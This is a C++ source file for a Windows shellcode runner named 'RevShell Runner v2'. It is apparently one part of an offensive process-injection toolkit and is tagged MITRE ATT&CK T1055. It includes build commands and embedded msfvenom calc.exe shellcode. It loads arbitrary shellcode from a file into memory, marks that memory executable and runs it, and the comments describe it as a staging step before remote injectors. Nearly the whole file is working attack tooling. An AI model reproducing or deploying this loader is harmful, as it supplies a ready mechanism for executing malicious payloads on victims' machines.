/*
 * Shellcode Runner v2 - self-identifying runner
 *
 * Plain English:
 *   Same local shellcode harness as v1, but the runner EXE itself has a
 *   custom VERSIONINFO baked in via shellcode_runner_v2.rc so Task
 *   Manager's Processes tab shows "RevShell Runner" for the runner
 *   process while it is executing your shellcode.
 *
 * What makes it different from v1:
 *   Same local-run mechanism. The .rc file supplies an identifiable
 *   name for the test harness itself. Useful when demoing how
 *   VERSIONINFO patching looks in Task Manager.
 *
 * Difference from shellcode_runner.cpp:
 *   v1 compiles as generic "runner.exe" with no version info - looks
 *   like any random exe in Task Manager. v2 embeds a .rc file with
 *   custom VERSIONINFO so the runner itself shows up as:
 *       RevShell Runner        <-- big text (FileDescription)
 *       runner_v2.exe          <-- image name
 *   in Task Manager Processes tab.
 *
 * MITRE ATT&CK: T1055 (base) - self-injection variant
 *
 * This is NOT remote process injection - the shellcode runs INSIDE
 * runner_v2.exe itself. Use it to validate shellcode before piping
 * through classic/apc/dll injectors into a remote target.
 *
 * Companion file:  shellcode_runner_v2.rc  (version resource)
 *
 * Compile (Linux cross):
 *   x86_64-w64-mingw32-windres shellcode_runner_v2.rc -o rc.o
 *   x86_64-w64-mingw32-g++ -std=c++20 -o runner_v2.exe shellcode_runner_v2.cpp rc.o
 *
 * Compile (Windows MSVC):
 *   rc shellcode_runner_v2.rc
 *   cl /std:c++20 shellcode_runner_v2.cpp shellcode_runner_v2.res /Fe:runner_v2.exe
 *
 * Usage:
 *   runner_v2.exe                       (embedded calc shellcode)
 *   runner_v2.exe shellcode.bin         (shellcode from file)
 *   runner_v2.exe shellcode.bin thread  (via CreateThread)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c */
unsigned char default_shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";

int main(int argc, char* argv[]) {
    unsigned char* shellcode = default_shellcode;
    DWORD scLen = sizeof(default_shellcode) - 1;
    int use_thread = 0;

    printf("[*] RevShell Runner v2 - self-identifying harness\n");

    if (argc >= 2) {
        for (int i = 1; i < argc; ++i) {
            if (strcmp(argv[i], "thread") == 0) { use_thread = 1; continue; }
            FILE* f = fopen(argv[i], "rb");
            if (!f) { printf("[-] open: %s\n", argv[i]); return 1; }
            fseek(f, 0, SEEK_END); scLen = ftell(f); fseek(f, 0, SEEK_SET);
            shellcode = (unsigned char*)malloc(scLen);
            fread(shellcode, 1, scLen, f);
            fclose(f);
            printf("[+] Loaded %lu bytes from %s\n", scLen, argv[i]);
        }
    } else {
        printf("[*] Embedded calc.exe shellcode (%lu bytes)\n", scLen);
    }

    /* W^X dance - RW then VirtualProtect to RX */
    LPVOID mem = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc\n"); return 1; }
    memcpy(mem, shellcode, scLen);
    DWORD old;
    VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, &old);
    printf("[+] Shellcode @ %p (W^X applied)\n", mem);

    if (use_thread) {
        HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        if (hT) { WaitForSingleObject(hT, INFINITE); CloseHandle(hT); }
    } else {
        ((void(*)())mem)();
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    if (shellcode != default_shellcode) free(shellcode);
    return 0;
}
